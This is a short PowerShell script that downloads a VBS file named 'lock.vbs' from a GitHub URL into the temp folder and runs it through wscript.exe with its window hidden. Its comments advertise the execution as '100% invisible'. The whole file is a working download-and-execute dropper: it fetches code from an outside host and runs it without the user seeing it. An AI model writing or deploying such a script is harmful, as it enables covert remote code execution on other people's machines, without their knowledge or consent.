# Downloads and runs a VBS script (100% invisible)
$url = "https://raw.githubusercontent.com/CodewithMubasher/Scripts/main/lock.vbs"
$vbsPath = Join-Path $env:TEMP "lock.vbs"

Invoke-WebRequest -Uri $url -OutFile $vbsPath

# Run VBS completely hidden
Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
